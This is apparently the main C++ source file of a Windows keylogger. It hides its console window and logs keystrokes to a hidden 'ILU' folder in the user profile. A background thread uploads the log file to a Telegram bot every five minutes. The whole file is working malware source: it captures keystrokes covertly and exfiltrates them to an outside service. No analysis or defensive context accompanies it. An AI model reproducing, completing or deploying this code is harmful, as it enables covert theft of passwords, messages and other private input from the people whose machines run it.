#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <sys/stat.h>
#include "logger.cpp"
#include "config.h"
#include "send_data.cpp"
#include <thread>
#include <chrono>


void periodicSend(const std::wstring& token, const std::wstring& chat_id, const std::wstring& filePath) {
    while (true) {
        sendFileToTelegram(token, chat_id, filePath);
        std::this_thread::sleep_for(std::chrono::minutes(5)); // 5 минут
    }
}

int main() {
    setlocale(LC_ALL, "Russian");

    const char* userProfilePath = std::getenv("USERPROFILE");
    char dirPath[MAX_PATH] = {0};
    snprintf(dirPath, MAX_PATH, "%s\\ILU", userProfilePath);
    snprintf(location, MY_MAX_PATH, "%s\\ILU\\keylog.txt", userProfilePath);

    std::wstring wlocation;
    int len = MultiByteToWideChar(CP_ACP, 0, location, -1, NULL, 0);
    if (len > 1) {
        std::vector<wchar_t> buf(len);
        MultiByteToWideChar(CP_ACP, 0, location, -1, buf.data(), len);
        wlocation.assign(buf.data());
    }

    DWORD ftyp = GetFileAttributesA(dirPath);
    if (ftyp == INVALID_FILE_ATTRIBUTES || !(ftyp & FILE_ATTRIBUTE_DIRECTORY)) {
        if (!CreateDirectoryA(dirPath, NULL)) {
            std::cerr << "Error: " << dirPath << std::endl;
            return 1;
        }
    }

    if (hideWindow == true) {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    }

    std::thread sender(periodicSend, botToken, userID, wlocation);
    sender.detach();

    HANDLE hThread1 = CreateThread(NULL, 0, Keylogger_main, NULL, 0, NULL);
    WaitForSingleObject(hThread1, INFINITE);

    while (true) {
        std::this_thread::sleep_for(std::chrono::hours(24));
    }

    return 0;
}
